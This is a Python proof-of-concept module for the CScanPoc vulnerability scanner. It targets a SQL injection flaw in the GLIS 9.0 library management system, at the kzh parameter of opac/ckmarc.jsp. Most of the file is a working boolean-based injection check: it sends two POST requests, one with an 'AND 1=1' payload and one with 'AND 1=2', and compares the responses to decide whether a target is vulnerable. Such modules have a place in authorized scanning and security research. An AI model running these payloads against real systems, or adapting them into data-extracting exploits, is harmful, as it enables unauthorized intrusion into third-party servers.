# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Infosea_0012'  # 平台漏洞编号，留空
    name = '北京清大新洋通用图书馆集成系统GLIS9.0 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-14'  # 漏洞公布时间
    desc = '''
        北京清大新洋通用图书馆集成系统GLIS9.0，存在注入漏洞： 
        opac/ckmarc.jsp
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '清大新洋'  # 漏洞应用名称
    product_version = '北京清大新洋通用图书馆集成系统GLIS9.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5236f12e-9303-4baf-b170-fd7c1c5b8a5b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-0132188
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/opac/ckmarc.jsp'
            postdata1 = 'kzh=zyk0040640%27%20AND%201%3D1%20AND%20%27jyNX%27%3D%27jyNX'
            postdata2 = 'kzh=zyk0040640%27%20AND%201%3D2%20AND%20%27jyNX%27%3D%27jyNX'
            code1, head, res1, errcode, _ = hh.http(arg + payload, postdata1)
            code2, head, res2, errcode, _ = hh.http(arg + payload, postdata2)
            m1 = re.findall('</td>', res1)
            m2 = re.findall('</td>', res2)

            if code1 == 200 and code2 == 200 and m1 != m2:
                #security_hole(arg+payload+'   :found sql Injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
